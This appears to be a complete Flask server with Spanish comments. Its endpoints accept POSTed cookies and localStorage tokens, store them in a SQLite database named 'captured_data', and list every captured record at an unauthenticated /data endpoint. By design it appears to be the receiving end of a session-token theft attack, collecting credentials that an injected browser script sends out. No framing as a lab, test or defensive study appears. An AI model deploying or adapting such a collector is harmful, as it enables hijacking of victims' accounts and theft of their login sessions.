from flask import Flask, request, jsonify, render_template
import sqlite3

app = Flask(__name__)

# Configurar la base de datos SQLite
DATABASE = 'captured_data.db'

def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captured_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, cookies TEXT, local_storage_tokens TEXT)''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    cookies = data.get('cookies')
    local_storage_tokens = data.get('localStorageTokens')

    # Insertar los datos en la base de datos SQLite
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("INSERT INTO captured_data (cookies, local_storage_tokens) VALUES (?, ?)",
              (cookies, local_storage_tokens))
    conn.commit()
    conn.close()

    return jsonify({"message": "Datos recibidos con éxito"})

@app.route('/data', methods=['GET'])
def get_data():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM captured_data")
    rows = c.fetchall()
    conn.close()

    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'cookies': row[1],
            'local_storage_tokens': row[2]
        })

    return jsonify(data)

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
